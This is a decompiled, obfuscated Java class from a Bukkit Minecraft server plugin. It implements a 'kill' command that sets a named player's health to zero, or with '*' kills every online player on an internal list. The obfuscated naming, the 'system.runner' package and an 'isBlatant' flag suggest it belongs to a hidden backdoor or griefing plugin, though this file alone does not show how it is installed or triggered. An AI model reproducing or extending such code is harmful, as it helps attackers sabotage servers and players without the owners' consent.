/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class KillCommand
extends Command {
    @Override
    public void execute(Core llllllllllllllIIllIllIIlIIlIIIII, String llllllllllllllIIllIllIIlIIlIIIll, String[] llllllllllllllIIllIllIIlIIlIIIlI, Player llllllllllllllIIllIllIIlIIlIIIIl) {
        if (llllllllllllllIIllIllIIlIIlIIIlI.length <= 1) {
            llllllllllllllIIllIllIIlIIlIIIIl.sendMessage(Settings.USAGE("kill <player>"));
        } else if (llllllllllllllIIllIllIIlIIlIIIlI[1].equals("*")) {
            for (Player llllllllllllllIIllIllIIlIIlIIlll : Bukkit.getOnlinePlayers()) {
                if (!llllllllllllllIIllIllIIlIIlIIIII.lite.contains(llllllllllllllIIllIllIIlIIlIIlll.getName())) continue;
                llllllllllllllIIllIllIIlIIlIIIII.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllIIllIllIIlIIlIIIII, () -> llllllllllllllIIllIllIIlIIlIIlll.setHealth(0.0));
            }
            llllllllllllllIIllIllIIlIIlIIIIl.sendMessage(Settings.PREFIX("Everyone not logged in was killed!"));
        } else {
            Player llllllllllllllIIllIllIIlIIlIIllI = Bukkit.getServer().getPlayer(llllllllllllllIIllIllIIlIIlIIIlI[1]);
            if (llllllllllllllIIllIllIIlIIlIIllI == null) {
                llllllllllllllIIllIllIIlIIlIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIllIllIIlIIlIIIlI[1]).append(Settings.WHITE).append(" is not online."))));
            } else {
                llllllllllllllIIllIllIIlIIlIIIII.getServer().getScheduler().runTaskAsynchronously((Plugin)llllllllllllllIIllIllIIlIIlIIIII, () -> llllllllllllllIIllIllIIlIIlIIllI.setHealth(0.0));
                llllllllllllllIIllIllIIlIIlIIIIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The player ").append(Settings.RED).append(llllllllllllllIIllIllIIlIIlIIllI.getName()).append(Settings.WHITE).append(" was killed"))));
            }
        }
    }

    public KillCommand() {
        KillCommand llllllllllllllIIllIllIIlIIlIllIl;
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

